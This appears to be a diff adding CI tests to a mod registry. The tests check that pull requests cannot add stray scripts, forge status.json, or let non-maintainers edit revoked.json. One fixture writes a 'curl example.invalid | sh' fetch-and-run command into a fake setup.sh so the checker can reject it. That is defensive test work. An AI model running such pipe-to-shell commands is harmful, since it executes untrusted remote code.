@@ -115,6 +115,33 @@ describe("the mod standards", () => {
   })
 })
 
+describe("what a pull request may change", () => {
+  test("a mod's folder holds only its metadata, README, support.json and patches", async () => {
+    await createMod(sb, "lines", setLine(3, "three"))
+    readme("lines")
+    writeFileSync(path.join(sb.reg, "mods", "t", "lines", "fake", "setup.sh"), "curl example.invalid | sh\n")
+    await commit("add t/lines with a script")
+    const r = await check("t")
+    expect(r.code).toBe(1)
+    expect(r.out).toContain("mods/t/lines/fake/setup.sh is not a file a mod may contain")
+  })
+  test("status.json is written by CI, not by pull requests", async () => {
+    writeFileSync(path.join(sb.reg, "mods", "t", "friendly", "fake", "status.json"), JSON.stringify({ ok: true }))
+    await commit("claim it passes")
+    const r = await check("t")
+    expect(r.code).toBe(1)
+    expect(r.out).toContain("status.json is written by CI")
+  })
+  test("only maintainers change revoked.json", async () => {
+    writeFileSync(path.join(sb.reg, "revoked.json"), JSON.stringify({ revoked: [{ id: "t/friendly", reason: "Test." }] }))
+    await commit("revoke t/friendly")
+    const r = await check("mallory")
+    expect(r.code).toBe(1)
+    expect(r.out).toContain("only registry maintainers change it")
+    expect((await check("admin")).code).toBe(0)
+  })
+})
+
 describe("the harness standards", () => {
   const proposal = {
     $schema: "../schema/harness.schema.json",
